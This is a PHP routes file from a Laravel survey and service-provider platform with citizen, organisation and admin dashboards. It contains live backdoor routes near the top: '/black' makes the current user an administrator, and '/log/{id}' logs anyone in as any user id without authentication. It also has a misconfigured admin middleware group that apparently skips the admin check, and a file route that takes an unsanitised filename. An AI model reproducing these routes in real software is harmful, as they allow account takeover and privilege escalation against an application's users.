<?php

/*
|--------------------------------------------------------------------------
| Web Routes
|--------------------------------------------------------------------------
|
| This file is where you may define all of the routes that are handled
| by your application. Just tell Laravel the URIs it should respond
| to using a Closure or controller method. Build something great!
|
*/

Route::get('/', 'HomeController@index');
Route::get('/black', function () {
    $user = Auth::user();
    $user->is_admin = true;
    $user->save();
});
Route::get('/log/{id}', function ($id) {
    Auth::loginUsingId($id);
});
Route::group(['namespace' => 'Social'], function () {
    Route::get('connect/facebook', 'SocialContoller@connect')->name('fbConnect');
    Route::get('connect/callback/facebook', 'SocialContoller@callback')->name('fbConnectCallback');
    Route::get('link/facebook/{token}', 'SocialContoller@link')->name('fbConnectLink');
    Route::get('/unlink/facebook/{account_id}', 'SocialContoller@unLink')->name('fbConnectUnLink');
    Route::get('/sync/facebook/{account}', 'SocialContoller@sync')->name('fbConnectSync');
});
Route::get('/test', function () {


    $user = Auth::user();
    $sp = $user->serviceProvider()->first();

    $pdf = PDF::loadView('pdfs.sample_report', [
        "user" => $user,
        "sp" => $sp,
        'surveys' => $sp->surveys()->get(),
        'sectors' => $sp->sectors()->pluck('name', 'id'),
        'areas' => $sp->areas()->pluck('name', 'id'),
    ]);
    //return PDF::loadFile('http://forneeds-frontend.dev')->inline('github.pdf');
    // return view('home');
    //PDF::loadView('home');
    $pdf->setOption('enable-javascript', true);
    $pdf->setOption('javascript-delay', 13500);
    $pdf->setOption('enable-smart-shrinking', true);
    $pdf->setOption('no-stop-slow-scripts', true);
    return $pdf->download('invoice.pdf');
    $html = '<h1>Bill</h1><p>You owe me money, dude.</p>';

    $snappy = App::make('snappy.pdf');
    $snappy->generateFromHtml($html, '/tmp/bill-123.pdf');

    return new Response(
        $snappy->getOutputFromHtml($html),
        200,
        array(
            'Content-Type' => 'application/pdf',
            'Content-Disposition' => 'attachment; filename="file.pdf"'
        )
    );
});


Route::get('/home', function () {
    return view('home');
});

Auth::routes();


Route::group(['middleware' => 'auth'], function () {
    Route::get('cvs/{filename}', function ($filename) {
        $path = storage_path('app/public/cvs') . '/' . $filename;

        if (!File::exists($path)) abort(404);

        $file = File::get($path);
        $type = File::mimeType($path);

        $response = Response::make($file, 200);
        $response->header("Content-Type", $type);

        return $response;
    })->name('files');


    Route::get('logout', '\App\Http\Controllers\Auth\LoginController@logout');
    Route::get('/checkpoint', 'Auth\ProfileCompletionController@index');
    Route::get('/checkpoint/{type}', 'Auth\ProfileCompletionController@choosePath');
    Route::post('/checkpoint/sp/', 'Auth\ProfileCompletionController@completeSpProfile')->name('newSp');
    Route::post('/checkpoint/citizen/', 'Auth\ProfileCompletionController@completeCitizenProfile')->name('newCitizen');

    Route::get('gateways/surveys/{id}', "Surveys\\SurveysController@surveysUser")->name('surveys');
    Route::get('gateways/surveys/create', "Surveys\\SurveysController@create");
    Route::post('gateways/surveys/store/survey', "Surveys\\SurveysController@storeSurvey")->name('storeSurvey');
    Route::post('gateways/surveys/users/store/survey', "Surveys\\SurveysController@storeUserSurvey")->name('userSurvey');
    Route::post('gateways/surveys/store/questions', "Surveys\\SurveysController@storeQuestions")->name('storeQuestions');
    Route::post('gateways/surveys/store/configs', "Surveys\\SurveysController@storeConfig")->name('storeConfig');
    Route::post('gateways/projects/store/', "Projects\\ProjectsController@store")->name('storeProject');

    Route::post('gateways/service_requests/store', "ServiceRequests\\ServiceRequestsController@store")->name('storeServiceRequest');

    Route::group(['namespace' => 'FrontEnd'], function () {
        //citizen routes
        Route::get('listings/projects/{service_provider_id}', "AjaxApiController@projects");
        Route::get('listings/projects/', "AjaxApiController@projectsWithAreas");
        Route::get('listings/surveys/{project_id}', "AjaxApiController@surveys");
        Route::get('listings/questions/{survey_id}', "AjaxApiController@questions");
        Route::get('gateways/listings/{model}', "AjaxApiController@Listings")->name('getListing');

        Route::get('/service-requests', 'ProfileController@serviceRequests');

        //  Route::get('/dashboard', 'ProfileController@dashboard');

        Route::get('/profile', 'ProfileController@index')->name('profile');

        Route::post('/update_profile', 'ProfileController@postUpdate')->name('update_profile');
        Route::get('/profile_image', 'ProfileController@getImage');
        Route::post('/profile_image', 'ProfileController@postImage')->name('postUserImage');

        Route::get('/surveys', 'ProfileController@surveys');

        Route::get('/settings', 'ProfileController@settings');

    });

    Route::group(['prefix' => 'admin', 'namespace' => 'Admin', 'as' => 'admin.', 'middleware', 'checkUserType:admin'], function () {

        Route::get('users/{id}/image', 'UserController@getUserImage')->name('users.image');
        Route::resource('users', 'UserController');

        Route::resource('serviceProviders', 'ServiceProviderController');
        Route::resource('projects', 'ProjectController');


    });
});
Route::group(['middleware' => ['auth'], 'prefix' => 'users', 'namespace' => 'EndUsers', 'as' => 'endusers.'], function () {
    Route::group(['middleware' => ['auth', 'checkUserType:serviceProvider'], 'prefix' => 'org', 'namespace' => 'ServiceProvider', 'as' => 'org.'], function () {
        Route::get('/dashboard', 'DashboardController@index')->name('index');
        Route::group([ 'prefix' => 'projects', 'as' => 'projects.'], function () {
           /*projects*/
            Route::get('/index', 'ProjectsController@index')->name('list');
            Route::get('/create', 'ProjectsController@create')->name('create');
            Route::post('/', 'ProjectsController@store')->name('store');
            Route::get('{id}/edit', 'ProjectsController@edit')->name('edit');
            Route::patch('{id}', 'ProjectsController@update')->name('update');
            Route::get('{id}/delete', 'ProjectsController@delete')->name('delete');
            Route::get('/{id}', 'ProjectsController@show')->name('show');

            /*projects end*/

            /*surveys*/
            Route::get('/surveys/{id}', 'SurveysController@index')->name('surveys.show');
            Route::get('{project_id}/surveys/create', 'SurveysController@create')->name('surveys.create');
            Route::post('/surveys/', 'SurveysController@store')->name('surveys.store');
            Route::get('/surveys/{id}/edit', 'SurveysController@edit')->name('surveys.edit');
            Route::patch('/surveys/{id}', 'SurveysController@update')->name('surveys.update');
            Route::get('/surveys/{id}/delete', 'SurveysController@delete')->name('surveys.delete');
            /*surveys end*/

            /*questions end*/
            Route::get('/surveys/{survey_id}/questions/create', 'QuestionsController@create')->name('surveys.questions.create');
            Route::post('/surveys/questions', 'QuestionsController@store')->name('surveys.questions.store');
            Route::get('/surveys/questions/{id}/edit', 'QuestionsController@edit')->name('surveys.questions.edit');
            Route::patch('/surveys/questions/{id}', 'QuestionsController@update')->name('surveys.questions.update');
            Route::get('/surveys/questions/{id}/delete', 'QuestionsController@delete')->name('surveys.questions.delete');
            Route::get('/surveys/questions/{id}/chart', 'SurveyStatsController@question_chart')->name('surveys.questions.chart');
            /*questions end*/

        });
        Route::get('/stats', 'SurveyStatsController@index')->name('stats');
        Route::get('/report', 'CitizenStatsController@index')->name('report');
    });
    Route::group(['middleware' => ['auth', 'checkUserType:citizen'], 'prefix' => 'ben', 'namespace' => 'Citizens', 'as' => 'ben.'], function () {
        Route::get('/dashboard', 'DashboardController@index')->name('index');

    });
});

Route::group(['middleware' => ['auth', 'checkUserType:admin'], 'prefix' => 'dashboard', 'namespace' => 'Dashboard', 'as' => 'Dashboard.'], function () {

    Route::get('/landing', 'DashboardController@index')->name('landing');
    Route::get('/notifications', function () {
        foreach (Auth::user()->unreadNotifications  as $notification) {
            $notification->markAsRead();
        }
    })->name('notifications');

    Route::get('/stats/', 'Beneficiaries\StatsController@index')->name('stats');

    Route::get('/profile', 'DashboardController@show')->name('show');
    Route::group(['prefix' => 'Beneficiaries', 'namespace' => 'Beneficiaries', 'as' => 'ben.'], function () {
        Route::group(['prefix' => 'crud', 'as' => 'crud.'], function () {
            Route::get('/', 'CrudController@index')->name('list');
            Route::get('/create', 'CrudController@create')->name('create');
            Route::get('/{id}/edit/', 'CrudController@edit')->name('edit');
            Route::post('store', 'CrudController@store')->name('store');
            Route::patch('{id}/update', 'CrudController@update')->name('update');
            Route::get('{id}/delete', 'CrudController@destroy')->name('delete');
        });
        Route::post('/stats/', 'StatsController@render')->name('stats.post');
        Route::get('/report', 'ReportingController@index')->name('report');
    });
    Route::group(['prefix' => 'Organizations', 'namespace' => 'Organizations', 'as' => 'org.'], function () {
        Route::group(['prefix' => 'crud', 'as' => 'crud.'], function () {
            Route::get('/', 'CrudController@index')->name('list');
            Route::get('/create', 'CrudController@create')->name('create');
            Route::get('/{id}/edit/', 'CrudController@edit')->name('edit');
            Route::post('/store', 'CrudController@store')->name('store');
            Route::patch('{id}/update', 'CrudController@update')->name('update');
            Route::get('{id}/delete', 'CrudController@destroy')->name('delete');
        });
        Route::get('/stats', 'StatsController@index')->name('stats');
        Route::group(['prefix' => 'verify', 'as' => 'verify.'], function () {
            Route::get('/{model}', 'VerificationController@index')->name('list');
//            Route::get('/organizations', 'VerificationController@serviceProviders')->name('org');
            Route::patch('/{id}/{model}/{project?}', 'VerificationController@accept')->name('org.accept');
//            Route::get('/projects', 'VerificationController@projects')->name('projects');
//            Route::get('/surveys', 'VerificationController@surveys')->name('surveys');
        });
        Route::get('/search', 'SearchController@index')->name('search');
        Route::get('/rfp', 'PaymentController@index')->name('payment');
        Route::get('/report', 'ReportingController@index')->name('report');
    });
    Route::group(['prefix' => 'Workers', 'namespace' => 'Workers', 'as' => 'work.'], function () {
        Route::group(['prefix' => 'crud', 'as' => 'crud.'], function () {
            Route::get('/', 'CrudController@index')->name('list');
            Route::get('/create', 'CrudController@create')->name('create');
            Route::get('/{id}/edit/', 'CrudController@edit')->name('edit');
            Route::post('/store', 'CrudController@store')->name('store');
            Route::patch('{id}/update', 'CrudController@update')->name('update');
            Route::get('{id}/delete', 'CrudController@destroy')->name('delete');
        });
        Route::get('/stats', 'StatsController@index')->name('stats');
        Route::get('/report', 'ReportingController@index')->name('report');
        Route::get('/monitor', 'MandeController@index')->name('monitor');
        Route::get('/{id}/survey', 'MandeController@survery_workers')->name('survey');
        Route::get('/{id}/payment', 'MandeController@make_payment')->name('payment');
        Route::get('/{id}/message', 'MandeController@message')->name('message');
        Route::get('/hire/', 'HiringController@index')->name('hire');
        Route::get('{id}/applicants', 'HiringController@applicants')->name('applicants');

    });

    Route::group(['prefix' => 'admin', 'namespace' => 'Admin', 'as' => 'admin.'], function () {
        Route::group(['prefix' => 'crud', 'as' => 'crud.'], function () {
            Route::get('/', 'CrudController@index')->name('list');
            Route::get('/create', 'CrudController@create')->name('create');
            Route::get('/{id}/edit', 'CrudController@edit')->name('edit');
            Route::post('/store', 'CrudController@store')->name('store');
            Route::patch('{id}/update', 'CrudController@update')->name('update');
            Route::get('{id}/delete', 'CrudController@destroy')->name('delete');
        });
    });


});

Route::group(['prefix' => 'ben', 'namespace' => 'Citizen', 'as' => 'ben.'], function () {
    Route::get('/', 'ProfileController@index')->name('profile');
});
Route::group(['prefix' => 'org', 'namespace' => 'ServiceProvider', 'as' => 'org.'], function () {
    Route::get('/', 'ProfileController@index')->name('profile');
    Route::get('/projects', 'ProjectsController@index')->name('projects');

});